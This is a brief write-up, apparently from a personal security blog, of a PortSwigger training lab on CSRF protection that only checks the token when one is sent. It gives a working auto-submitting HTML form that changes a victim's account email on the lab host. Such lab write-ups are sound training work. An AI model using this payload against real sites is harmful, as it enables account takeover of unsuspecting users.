+++
date = '2026-06-04T14:01:16+08:00'
draft = false
title = 'CSRF where token validation depends on token being present'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Just as the name of the lab implies, the validation depends on whether the csrf token is included in the request or not. 

To bypass this, we can just *not send* the token. Our old payload from the last two labs can be applied straight away:
```html
<html>
<body>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST" id="attack">
<input type="hidden" name="email" value="super-ultimate-hacker@leet-hacker.net">
</form>

<script>
document.getElementById("attack").submit();
</script>

</body>
</html>
```